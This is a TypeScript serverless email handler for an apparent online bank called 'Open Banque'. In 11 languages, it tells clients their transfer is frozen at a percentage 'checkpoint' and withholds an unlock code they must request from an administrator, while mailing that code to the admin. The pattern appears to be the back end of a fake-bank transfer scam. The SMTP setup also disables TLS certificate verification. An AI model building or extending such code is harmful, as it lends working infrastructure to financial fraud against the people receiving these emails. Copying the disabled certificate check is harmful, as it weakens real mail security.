import type { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from 'nodemailer';

// Helper function to escape HTML to prevent XSS
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return (text || '').replace(/[&<>"']/g, (m) => map[m]);
}

// Helper to send email via Resend API or Nodemailer
async function sendEmail({
  from,
  to,
  subject,
  html,
  text
}: {
  from: string;
  to: string | string[];
  subject: string;
  html: string;
  text: string;
}) {
  const resendApiKey = process.env.RESEND_API_KEY;

  if (resendApiKey) {
    const toArray = Array.isArray(to) ? to : [to];
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${resendApiKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from,
        to: toArray,
        subject,
        html,
        text
      })
    });

    const data = await res.json();
    if (!res.ok) {
      console.error('❌ Resend API error:', data);
      throw new Error(data.message || 'Resend API failed');
    }
    return { messageId: data.id };
  }

  // Fallback to Nodemailer SMTP
  const smtpUser = process.env.SMTP_USER;
  const smtpPassword = process.env.SMTP_PASSWORD;
  if (!smtpUser || !smtpPassword) {
    throw new Error('No email provider configured. Please set RESEND_API_KEY or SMTP credentials.');
  }

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.zoho.com',
    port: parseInt(process.env.SMTP_PORT || '587'),
    secure: process.env.SMTP_SECURE === 'true',
    auth: { user: smtpUser, pass: smtpPassword },
    tls: { rejectUnauthorized: false }
  });

  return await transporter.sendMail({
    from,
    to: Array.isArray(to) ? to.join(', ') : to,
    subject,
    html,
    text
  });
}

// Complete 11 languages translations for the CLIENT email
const VALIDATION_EMAIL_TRANSLATIONS: Record<string, Record<string, string>> = {
  fr: {
    subject: 'Vérification de sécurité requise pour votre transfert - Open Banque',
    greeting: 'Bonjour',
    title: 'Vérification de Sécurité Requise',
    badge: 'Protocole de Sécurité Activé',
    message1: 'Votre transfert est actuellement en cours et a atteint un palier de contrôle obligatoire.',
    message2: 'Pour votre protection financière, un code de validation de sécurité unique a été généré et transmis à l\'administrateur du système.',
    message3: 'Pour continuer le virement et libérer vos fonds, veuillez contacter l\'administrateur ou le support en ligne afin d\'obtenir votre code de validation.',
    contactNoticeTitle: 'Code transmis à l\'administrateur',
    contactNoticeDesc: 'Pour des raisons de haute sécurité bancaire, le code de validation n\'est pas affiché dans cet email. Veuillez contacter votre administrateur ou le support client pour obtenir votre code de déblocage.',
    progress: 'Progression du transfert',
    amount: 'Montant',
    recipient: 'Bénéficiaire',
    instructions: 'Instructions pour débloquer votre virement',
    instruction1: '1. Contactez l\'administrateur ou le support pour obtenir votre code',
    instruction2: '2. Rendez-vous sur votre tableau de bord Open Banque',
    instruction3: '3. Ouvrez la fenêtre de suivi du virement',
    instruction4: '4. Saisissez le code fourni et cliquez sur "VALIDER" pour libérer les fonds',
    footer: 'Cordialement,',
    footerTeam: 'L\'équipe Sécurité Open Banque',
    footerNote: 'Cet email automatique est envoyé pour la protection de vos avoirs financiers.',
    footerSecurity: 'Vos fonds sont protégés et restent disponibles sur votre compte.'
  },
  en: {
    subject: 'Security verification required for your transfer - Open Banque',
    greeting: 'Hello',
    title: 'Security Verification Required',
    badge: 'Security Protocol Activated',
    message1: 'Your transfer is currently in progress and has reached a mandatory security verification checkpoint.',
    message2: 'For your financial protection, a unique security validation code has been generated and sent to the system administrator.',
    message3: 'To continue the transfer and release your funds, please contact the administrator or online support to obtain your validation code.',
    contactNoticeTitle: 'Code sent to administrator',
    contactNoticeDesc: 'For high-security banking compliance, the validation code is not displayed in this email. Please contact your administrator or customer support to obtain your unlock code.',
    progress: 'Transfer progress',
    amount: 'Amount',
    recipient: 'Recipient',
    instructions: 'Instructions to unlock your transfer',
    instruction1: '1. Contact the administrator or support to get your code',
    instruction2: '2. Go to your Open Banque dashboard',
    instruction3: '3. Open the transfer monitoring window',
    instruction4: '4. Enter the code provided and click "VALIDATE" to release funds',
    footer: 'Best regards,',
    footerTeam: 'The Open Banque Security Team',
    footerNote: 'This automatic email is sent for the protection of your financial assets.',
    footerSecurity: 'Your funds are secure and remain protected in your account.'
  },
  nl: {
    subject: 'Beveiligingsverificatie vereist voor uw overboeking - Open Banque',
    greeting: 'Hallo',
    title: 'Beveiligingsverificatie Vereist',
    badge: 'Beveiligingsprotocol Geactiveerd',
    message1: 'Uw overboeking is momenteel in behandeling en heeft een verplicht controlepunt bereikt.',
    message2: 'Voor uw financiële bescherming is er een unieke beveiligingscode gegenereerd en naar de beheerder gestuurd.',
    message3: 'Om de overboeking voort te zetten en uw fondsen vrij te geven, neemt u contact op met de beheerder of de online ondersteuning om uw validatiecode te verkrijgen.',
    contactNoticeTitle: 'Code verzonden naar beheerder',
    contactNoticeDesc: 'Om veiligheidsredenen wordt de validatiecode niet in deze e-mail weergegeven. Neem contact op met uw beheerder om uw ontgrendelcode te ontvangen.',
    progress: 'Voortgang overboeking',
    amount: 'Bedrag',
    recipient: 'Begunstigde',
    instructions: 'Instructies om uw overboeking te ontgrendelen',
    instruction1: '1. Neem contact op met de beheerder om uw code te verkrijgen',
    instruction2: '2. Ga naar uw Open Banque-dashboard',
    instruction3: '3. Open het overboekingsvenster',
    instruction4: '4. Voer de code in en klik op "VALIDEER" om fondsen vrij te geven',
    footer: 'Met vriendelijke groet,',
    footerTeam: 'Het Open Banque Beveiligingsteam',
    footerNote: 'Deze automatische e-mail is verzonden ter bescherming van uw tegoeden.',
    footerSecurity: 'Uw tegoeden zijn veilig en blijven beschermd op uw rekening.'
  },
  de: {
    subject: 'Sicherheitsüberprüfung für Ihre Überweisung erforderlich - Open Banque',
    greeting: 'Hallo',
    title: 'Sicherheitsüberprüfung Erforderlich',
    badge: 'Sicherheitsprotokoll Aktiviert',
    message1: 'Ihre Überweisung wird derzeit bearbeitet und hat einen obligatorischen Sicherheitskontrollpunkt erreicht.',
    message2: 'Zu Ihrem Schutz wurde ein eindeutiger Validierungscode generiert und an den Administrator gesendet.',
    message3: 'Um die Überweisung fortzusetzen und Ihre Gelder freizugeben, wenden Sie sich bitte an den Administrator oder den Support.',
    contactNoticeTitle: 'Code an Administrator gesendet',
    contactNoticeDesc: 'Aus Sicherheitsgründen wird der Validierungscode nicht in dieser E-Mail angezeigt. Bitte kontaktieren Sie Ihren Administrator, um den Freischaltcode zu erhalten.',
    progress: 'Überweisungsfortschritt',
    amount: 'Betrag',
    recipient: 'Empfänger',
    instructions: 'Anweisungen zur Freigabe Ihrer Überweisung',
    instruction1: '1. Kontaktieren Sie den Administrator, um Ihren Code zu erhalten',
    instruction2: '2. Öffnen Sie Ihr Open Banque Dashboard',
    instruction3: '3. Rufen Sie das Überweisungsfenster auf',
    instruction4: '4. Geben Sie den Code ein und klicken Sie auf "BESTÄTIGEN"',
    footer: 'Mit freundlichen Grüßen,',
    footerTeam: 'Ihr Open Banque Sicherheitsteam',
    footerNote: 'Diese E-Mail dient dem Schutz Ihres Vermögens.',
    footerSecurity: 'Ihr Guthaben bleibt sicher auf Ihrem Konto.'
  },
  es: {
    subject: 'Verificación de seguridad requerida para su transferencia - Open Banque',
    greeting: 'Hola',
    title: 'Verificación de Seguridad Requerida',
    badge: 'Protocolo de Seguridad Activado',
    message1: 'Su transferencia está en curso y ha alcanzado un punto de control de seguridad obligatorio.',
    message2: 'Para su protección financiera, se ha generado un código de validación único y se ha enviado al administrador.',
    message3: 'Para continuar la transferencia y liberar sus fondos, comuníquese con el administrador o con el soporte en línea para obtener su código.',
    contactNoticeTitle: 'Código enviado al administrador',
    contactNoticeDesc: 'Por estrictas razones de seguridad bancaria, el código no se muestra en este correo. Póngase en contacto con su administrador para obtenerlo.',
    progress: 'Progreso de la transferencia',
    amount: 'Monto',
    recipient: 'Destinatario',
    instructions: 'Instrucciones para desbloquear su transferencia',
    instruction1: '1. Contacte al administrador para solicitar su código',
    instruction2: '2. Diríjase a su panel de Open Banque',
    instruction3: '3. Abra la ventana de seguimiento de la transferencia',
    instruction4: '4. Ingrese el código recibido y haga clic en "VALIDAR"',
    footer: 'Atentamente,',
    footerTeam: 'El equipo de Seguridad Open Banque',
    footerNote: 'Este correo electrónico se envía para la protección de sus fondos.',
    footerSecurity: 'Sus fondos permanecen seguros y protegidos en su cuenta.'
  },
  it: {
    subject: 'Verifica di sicurezza richiesta per il tuo bonifico - Open Banque',
    greeting: 'Ciao',
    title: 'Verifica di Sicurezza Richiesta',
    badge: 'Protocollo di Sicurezza Attivato',
    message1: 'Il tuo bonifico è in corso ed è stato sospeso a un punto di controllo di sicurezza obbligatorio.',
    message2: 'Per la tua sicurezza finanziaria, è stato generato un codice di convalida univoco inviato all\'amministratore.',
    message3: 'Per proseguire e sbloccare i fondi, contatta l\'amministratore o l\'assistenza per ottenere il codice di convalida.',
    contactNoticeTitle: 'Codice inviato all\'amministratore',
    contactNoticeDesc: 'Per motivi di sicurezza bancaria, il codice non è riportato in questa email. Contatta l\'amministratore per riceverlo.',
    progress: 'Avanzamento del bonifico',
    amount: 'Importo',
    recipient: 'Beneficiario',
    instructions: 'Istruzioni per sbloccare il bonifico',
    instruction1: '1. Contatta l\'amministratore per ottenere il codice',
    instruction2: '2. Accedi alla tua dashboard Open Banque',
    instruction3: '3. Apri la schermata di monitoraggio del bonifico',
    instruction4: '4. Inserisci il codice ricevuto e clicca su "CONFERMA"',
    footer: 'Cordiali saluti,',
    footerTeam: 'Il team Sicurezza Open Banque',
    footerNote: 'Questa email automatica è inviata a tutela dei tuoi fondi.',
    footerSecurity: 'I tuoi fondi rimangono al sicuro sul tuo conto.'
  },
  pt: {
    subject: 'Verificação de segurança necessária para a sua transferência - Open Banque',
    greeting: 'Olá',
    title: 'Verificação de Segurança Necessária',
    badge: 'Protocolo de Segurança Ativado',
    message1: 'A sua transferência está em processamento e atingiu um ponto de controle de segurança obrigatório.',
    message2: 'Para sua proteção, um código de validação exclusivo foi gerado e enviado ao administrador do sistema.',
    message3: 'Para continuar a transferência e liberar os fundos, entre em contato com o administrador ou suporte.',
    contactNoticeTitle: 'Código transmitido ao administrador',
    contactNoticeDesc: 'Por motivos de segurança bancária, o código de validação não é exibido neste e-mail. Solicite o código ao administrador.',
    progress: 'Progresso da transferência',
    amount: 'Montante',
    recipient: 'Beneficiário',
    instructions: 'Instruções para desbloquear a transferência',
    instruction1: '1. Entre em contacto com o administrador para obter o código',
    instruction2: '2. Aceda ao seu painel Open Banque',
    instruction3: '3. Abra a janela de acompanhamento da transferência',
    instruction4: '4. Insira o código e clique em "VALIDAR"',
    footer: 'Atenciosamente,',
    footerTeam: 'A equipa de Segurança Open Banque',
    footerNote: 'Este e-mail é enviado automaticamente para a proteção dos seus ativos.',
    footerSecurity: 'Os seus fundos permanecem seguros na sua conta.'
  },
  ru: {
    subject: 'Требуется проверка безопасности для вашего перевода - Open Banque',
    greeting: 'Здравствуйте',
    title: 'Требуется проверка безопасности',
    badge: 'Протокол безопасности активирован',
    message1: 'Ваш перевод обрабатывается и достиг обязательного этапа проверки безопасности.',
    message2: 'Для защиты ваших средств уникальный код подтверждения был сгенерирован и отправлен администратору.',
    message3: 'Чтобы продолжить перевод и разблокировать средства, свяжитесь с администратором или службой поддержки.',
    contactNoticeTitle: 'Код отправлен администратору',
    contactNoticeDesc: 'В целях безопасности код подтверждения не указан в этом письме. Обратитесь к администратору для его получения.',
    progress: 'Ход перевода',
    amount: 'Сумма',
    recipient: 'Получатель',
    instructions: 'Инструкция по разблокировке перевода',
    instruction1: '1. Свяжитесь с администратором для получения кода',
    instruction2: '2. Перейдите в личный кабинет Open Banque',
    instruction3: '3. Откройте окно мониторинга перевода',
    instruction4: '4. Введите полученный код и нажмите «ПОДТВЕРДИТЬ»',
    footer: 'С уважением,',
    footerTeam: 'Служба безопасности Open Banque',
    footerNote: 'Это автоматическое уведомление отправлено для защиты ваших средств.',
    footerSecurity: 'Ваши средства находятся в безопасности на вашем счете.'
  },
  zh: {
    subject: '您的转账需要安全验证 - Open Banque',
    greeting: '您好',
    title: '需要安全验证',
    badge: '安全协议已激活',
    message1: '您的转账正在进行中，已到达强制安全验证节点。',
    message2: '为了您的资金安全，系统已生成唯一验证码并直接发送给管理员。',
    message3: '要继续转账并解冻资金，请联系管理员或在线客服以获取验证码。',
    contactNoticeTitle: '验证码已发送给管理员',
    contactNoticeDesc: '出于高级银行安全合规要求，此邮件不显示验证码。请联系您的管理员获取解冻验证码。',
    progress: '转账进度',
    amount: '金额',
    recipient: '收款人',
    instructions: '解冻转账操作指南',
    instruction1: '1. 联系管理员获取验证码',
    instruction2: '2. 进入您的 Open Banque 控制面板',
    instruction3: '3. 打开转账跟踪监控窗口',
    instruction4: '4. 输入收到的验证码并点击“验证”以释放资金',
    footer: '此致，',
    footerTeam: 'Open Banque 安全团队',
    footerNote: '此自动邮件旨在保护您的金融资产。',
    footerSecurity: '您的资金受到严格保护，安全存放在您的账户中。'
  },
  ja: {
    subject: '送金に関するセキュリティ確認が必要です - Open Banque',
    greeting: 'こんにちは',
    title: 'セキュリティ確認が必要です',
    badge: 'セキュリティプロトコル作動中',
    message1: '送金手続きが進行中ですが、必須のセキュリティ確認段階に到達しました。',
    message2: '資金保護のため、一意の確認コードが生成されシステム管理者に送信されました。',
    message3: '送金を継続し資金を解除するには、管理者またはサポートに連絡して確認コードを取得してください。',
    contactNoticeTitle: 'コードは管理者に送信されました',
    contactNoticeDesc: '銀行の厳格なセキュリティ方針に基づき、本メールには確認コードは記載されません。コードは管理者よりお受け取りください。',
    progress: '送金進捗',
    amount: '金額',
    recipient: '受取人',
    instructions: '送金解除の手順',
    instruction1: '1. 管理者に連絡してコードを取得してください',
    instruction2: '2. Open Banqueダッシュボードを開きます',
    instruction3: '3. 送金進捗画面を表示します',
    instruction4: '4. 提供されたコードを入力し「確認」をクリックして資金を解除します',
    footer: '敬具',
    footerTeam: 'Open Banque セキュリティチーム',
    footerNote: 'この自動メールはお客様の資産保護のために送信されています。',
    footerSecurity: '資金はお客様の口座で安全に保護されています。'
  },
  ar: {
    subject: 'مطلوب التحقق الأمني لتحويلك - Open Banque',
    greeting: 'مرحباً',
    title: 'التحقق الأمني مطلوب',
    badge: 'تم تفعيل بروتوكول الأمان',
    message1: 'تحويلك قيد التنفيذ ووصل إلى نقطة تحقق أمني إلزامية.',
    message2: 'لحماية أموالك، تم إنشاء رمز تحقق فريد وإرساله مباشرة إلى مسؤول النظام.',
    message3: 'لمتابعة التحويل والإفراج عن أموالك، يرجى التواصل مع المسؤول أو الدعم للحصول على رمز التحقق.',
    contactNoticeTitle: 'تم إرسال الرمز إلى المسؤول',
    contactNoticeDesc: 'لدواعي الأمان المصرفي المشدد، لا يتم عرض رمز التحقق في هذا البريد. يرجى التواصل مع مسؤولك للحصول عليه.',
    progress: 'تقدم التحويل',
    amount: 'المبلغ',
    recipient: 'المستفيد',
    instructions: 'تعليمات استكمال التحويل',
    instruction1: '1. تواصل مع المسؤول للحصول على الرمز',
    instruction2: '2. انتقل إلى لوحة تحكم Open Banque',
    instruction3: '3. افتح نافذة متابعة التحويل',
    instruction4: '4. أدخل الرمز وانقر على "التحقق" للإفراج عن الأموال',
    footer: 'مع خالص التحيات،',
    footerTeam: 'فريق أمان Open Banque',
    footerNote: 'تم إرسال هذا البريد تلقائياً لحماية أصولك المالية.',
    footerSecurity: 'أموالك محمية بالكامل وتبقى آمنة في حسابك.'
  }
};

export default async function handler(
  req: VercelRequest,
  res: VercelResponse,
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { name, email, language = 'fr', code, amount, recipientName, progress } = req.body;

    if (!name || !email || !code) {
      return res.status(400).json({ 
        error: 'Missing required fields',
        required: ['name', 'email', 'code']
      });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }

    // Determine language (exact match or fallback to French)
    const langKey = typeof language === 'string' ? language.toLowerCase() : 'fr';
    const t = VALIDATION_EMAIL_TRANSLATIONS[langKey] || VALIDATION_EMAIL_TRANSLATIONS['fr'];

    const fromEmail = process.env.FROM_EMAIL || 'Open Banque <contact@openbanque.company>';
    // We send from a distinct security sender address so Zoho displays "Sécurité Open Banque" instead of "Me"
    const securitySender = 'Sécurité Open Banque <securite@openbanque.company>';
    const adminAlertEmail = process.env.ADMIN_ALERT_EMAIL || 'contact@openbanque.company';

    const safeName = escapeHtml(name);
    const safeEmail = escapeHtml(email);
    const safeCode = escapeHtml(code);
    const safeAmount = amount ? escapeHtml(amount.toString()) : '';
    const safeRecipient = recipientName ? escapeHtml(recipientName) : '';
    const safeProgress = progress ? escapeHtml(progress.toString()) : '';

    // ==========================================
    // 1. EMAIL POUR LE CLIENT (SANS LE CODE !)
    // ==========================================
    const clientHtml = `
      <!DOCTYPE html>
      <html lang="${langKey}">
      <head>
        <meta charset="UTF-8">
        <title>${t.subject}</title>
      </head>
      <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0f172a; color: #f8fafc;">
        <table role="presentation" style="width: 100%; border-collapse: collapse; padding: 30px 15px;">
          <tr>
            <td align="center">
              <table role="presentation" style="max-width: 600px; width: 100%; background-color: #1e293b; border: 1px solid #334155; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);">
                <!-- Header with Brand Logo -->
                <tr>
                  <td style="background: linear-gradient(135deg, #059669 0%, #0d9488 100%); padding: 35px 30px; text-align: center;">
                    <div style="font-size: 26px; font-weight: 800; color: #ffffff; letter-spacing: 0.5px;">
                      OPEN BANQUE
                    </div>
                    <div style="font-size: 13px; color: #a7f3d0; margin-top: 4px; text-transform: uppercase; letter-spacing: 1.5px;">
                      ${t.badge}
                    </div>
                  </td>
                </tr>

                <!-- Content -->
                <tr>
                  <td style="padding: 35px 30px;">
                    <div style="display: inline-block; background-color: rgba(245, 158, 11, 0.15); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 9999px; padding: 6px 16px; margin-bottom: 20px;">
                      <span style="color: #fbbf24; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">
                        🔒 ${t.title}
                      </span>
                    </div>

                    <h2 style="margin: 0 0 16px 0; color: #ffffff; font-size: 20px; font-weight: 700;">
                      ${t.greeting} ${safeName},
                    </h2>

                    <p style="margin: 0 0 20px 0; color: #cbd5e1; font-size: 15px; line-height: 1.6;">
                      ${t.message1} ${t.message2}
                    </p>

                    <!-- Transaction details card -->
                    <table role="presentation" style="width: 100%; background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin-bottom: 25px; border-collapse: collapse;">
                      <tr>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">${t.amount}</td>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #34d399; font-size: 16px; font-weight: 700; text-align: right;">${safeAmount} €</td>
                      </tr>
                      <tr>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">${t.recipient}</td>
                        <td style="padding: 14px 18px; border-bottom: 1px solid #1e293b; color: #ffffff; font-size: 14px; font-weight: 600; text-align: right;">${safeRecipient}</td>
                      </tr>
                      <tr>
                        <td style="padding: 14px 18px; color: #94a3b8; font-size: 13px;">${t.progress}</td>
                        <td style="padding: 14px 18px; color: #38bdf8; font-size: 14px; font-weight: 700; text-align: right;">${safeProgress}%</td>
                      </tr>
                    </table>

                    <!-- Official Security Notice Box (NO CODE DISPLAYED) -->
                    <div style="background: linear-gradient(135deg, rgba(245, 158, 11, 0.12) 0%, rgba(217, 119, 6, 0.12) 100%); border: 1px solid rgba(245, 158, 11, 0.4); border-radius: 12px; padding: 22px; text-align: center; margin-bottom: 25px;">
                      <div style="font-size: 28px; margin-bottom: 8px;">🔐</div>
                      <div style="color: #fbbf24; font-size: 15px; font-weight: 700; margin-bottom: 6px;">
                        ${t.contactNoticeTitle}
                      </div>
                      <div style="color: #cbd5e1; font-size: 13px; line-height: 1.6;">
                        ${t.contactNoticeDesc}
                      </div>
                    </div>

                    <p style="margin: 0 0 20px 0; color: #cbd5e1; font-size: 14px; line-height: 1.6;">
                      ${t.message3}
                    </p>

                    <!-- Instructions -->
                    <div style="background-color: #0f172a; border-left: 3px solid #10b981; border-radius: 0 8px 8px 0; padding: 16px 20px; margin-bottom: 25px;">
                      <div style="color: #ffffff; font-weight: 700; font-size: 13px; margin-bottom: 8px;">${t.instructions}</div>
                      <div style="color: #94a3b8; font-size: 13px; line-height: 1.7;">
                        ${t.instruction1}<br>
                        ${t.instruction2}<br>
                        ${t.instruction3}<br>
                        ${t.instruction4}
                      </div>
                    </div>

                    <p style="margin: 0; color: #64748b; font-size: 13px;">
                      ${t.footer}<br>
                      <strong style="color: #94a3b8;">${t.footerTeam}</strong>
                    </p>
                  </td>
                </tr>

                <!-- Footer -->
                <tr>
                  <td style="background-color: #0f172a; border-top: 1px solid #334155; padding: 20px 30px; text-align: center; color: #64748b; font-size: 11px; line-height: 1.5;">
                    <p style="margin: 0 0 6px 0;">${t.footerNote}</p>
                    <p style="margin: 0;">${t.footerSecurity}</p>
                    <p style="margin: 6px 0 0 0;">© ${new Date().getFullYear()} Open Banque Corporation • <a href="https://openbanque.company" style="color: #10b981; text-decoration: none;">openbanque.company</a></p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      </body>
      </html>
    `;

    // ==========================================
    // 2. EMAIL D'ALERTE POUR L'ADMIN (AVEC LE CODE !)
    // ==========================================
    const adminSubject = `🚨 [ALERTE SÉCURITÉ] Arrêt transfert à ${safeProgress}% • ${safeName} (${safeAmount} €) • Code: ${safeCode}`;
    const adminHtml = `
      <!DOCTYPE html>
      <html>
      <head><meta charset="UTF-8"><title>${adminSubject}</title></head>
      <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0b1329; color: #f8fafc;">
        <table role="presentation" style="width: 100%; border-collapse: collapse; padding: 30px 15px;">
          <tr>
            <td align="center">
              <table role="presentation" style="max-width: 600px; width: 100%; background-color: #1e293b; border: 2px solid #ef4444; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.6);">
                <tr>
                  <td style="background: linear-gradient(135deg, #b91c1c 0%, #dc2626 100%); padding: 30px; text-align: center;">
                    <div style="font-size: 24px; font-weight: 800; color: #ffffff;">
                      🔒 ALERTE ADMINISTRATEUR OPEN BANQUE
                    </div>
                    <div style="font-size: 13px; color: #fecaca; margin-top: 4px; text-transform: uppercase; letter-spacing: 1px;">
                      Interception de transaction • Code de sécurité requis
                    </div>
                  </td>
                </tr>

                <tr>
                  <td style="padding: 30px;">
                    <p style="color: #e2e8f0; font-size: 15px; margin-top: 0;">
                      Une transaction en cours a été <strong>suspendue au palier de contrôle de ${safeProgress}%</strong>. L'utilisateur attend la confirmation du code de validation.
                    </p>

                    <!-- Details Table -->
                    <table role="presentation" style="width: 100%; background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; border-collapse: collapse;">
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Nom du client</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #ffffff; font-weight: 700; text-align: right;">${safeName}</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Email client</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #38bdf8; text-align: right;"><a href="mailto:${safeEmail}" style="color: #38bdf8; text-decoration: none;">${safeEmail}</a></td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Montant du transfert</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #34d399; font-weight: 800; font-size: 16px; text-align: right;">${safeAmount} €</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Bénéficiaire</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #ffffff; text-align: right;">${safeRecipient}</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #94a3b8; font-size: 13px;">Étape de blocage</td>
                        <td style="padding: 12px 16px; border-bottom: 1px solid #1e293b; color: #fbbf24; font-weight: 700; text-align: right;">${safeProgress}%</td>
                      </tr>
                      <tr>
                        <td style="padding: 12px 16px; color: #94a3b8; font-size: 13px;">Date & Heure</td>
                        <td style="padding: 12px 16px; color: #94a3b8; text-align: right;">${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}</td>
                      </tr>
                    </table>

                    <!-- Validation Code Box (ADMIN ONLY) -->
                    <div style="background-color: #0f172a; border: 2px solid #34d399; border-radius: 12px; padding: 20px; text-align: center; margin: 25px 0;">
                      <div style="color: #94a3b8; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px;">
                        CODE DE VALIDATION ATTENDU
                      </div>
                      <div style="font-family: 'Courier New', monospace; font-size: 36px; font-weight: 900; color: #34d399; letter-spacing: 8px;">
                        ${safeCode}
                      </div>
                      <div style="color: #64748b; font-size: 12px; margin-top: 8px;">
                        Le client ne dispose PAS de ce code. Vous devez le lui transmettre manuellement s'il vous contacte.
                      </div>
                    </div>

                    <div style="background-color: rgba(56, 189, 248, 0.1); border-left: 3px solid #38bdf8; padding: 12px 16px; border-radius: 0 8px 8px 0; color: #cbd5e1; font-size: 13px;">
                      💡 <em>Vous pouvez également suivre et débloquer ce transfert directement depuis le panneau d'administration Open Banque.</em>
                    </div>
                  </td>
                </tr>

                <tr>
                  <td style="background-color: #0f172a; padding: 15px 30px; text-align: center; color: #64748b; font-size: 11px;">
                    Notification générée automatiquement par le système de sécurité Open Banque.
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      </body>
      </html>
    `;

    // 1. Envoyer l'email au client (SANS CODE !)
    console.log(`📤 Envoi de l'email au client (${langKey}):`, email);
    const clientSend = await sendEmail({
      from: fromEmail,
      to: email,
      subject: t.subject,
      html: clientHtml,
      text: `${t.greeting} ${safeName},\n\n${t.message1}\nMontant: ${safeAmount} €\nBénéficiaire: ${safeRecipient}\nProgression: ${safeProgress}%\n\n${t.contactNoticeDesc}\n\n${t.instructions}:\n${t.instruction1}\n${t.instruction2}\n${t.instruction3}\n${t.instruction4}`
    });

    // 2. Envoyer l'email d'alerte à l'admin (avec expéditeur "Sécurité Open Banque" pour éviter "Me" sur Zoho)
    console.log('🚨 Envoi de l\'alerte à l\'administrateur:', adminAlertEmail);
    let adminSend = null;
    try {
      adminSend = await sendEmail({
        from: securitySender,
        to: adminAlertEmail,
        subject: adminSubject,
        html: adminHtml,
        text: `ALERTE SÉCURITÉ OPEN BANQUE\n\nClient: ${safeName} (${safeEmail})\nMontant: ${safeAmount} €\nBénéficiaire: ${safeRecipient}\nProgression: ${safeProgress}%\n\nCODE ATTENDU: ${safeCode}`
      });
    } catch (err: any) {
      console.error('⚠️ Erreur lors de l\'envoi à l\'admin (non bloquant pour le client):', err.message);
    }

    return res.status(200).json({
      success: true,
      clientMessageId: clientSend.messageId,
      adminMessageId: adminSend?.messageId || null,
      message: 'Emails envoyés avec succès au client et à l\'administrateur'
    });

  } catch (error: any) {
    console.error('❌ Erreur lors du traitement de l\'email:', error);
    return res.status(500).json({
      success: false,
      error: 'Failed to send validation email',
      details: error.message
    });
  }
}
